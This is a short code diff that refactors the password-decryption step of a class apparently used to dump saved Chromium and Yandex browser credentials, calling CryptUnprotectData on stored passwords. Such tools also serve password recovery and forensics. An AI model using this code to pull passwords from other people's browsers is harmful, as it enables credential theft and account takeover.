@@ -108,15 +108,18 @@ class Chromium:
                     pass
         else:
             try:
-                password_bytes = CryptUnprotectData(password, profile)
+                pwd = CryptUnprotectData(password, profile)
             except:
                 try:
-                    password_bytes = CryptUnprotectData(password, profile)
+                    pwd = CryptUnprotectData(password, profile)
                 except:
-                    password_bytes = None
+                    pass
 
-            if password_bytes is not None:
-                pwd = password_bytes.decode()
+            try:
+                pwd = pwd.decode()
+            except:
+                pass
+
         return pwd
 
     def creds_dump(self, profile, db_path, is_yandex=False, master_key=None):
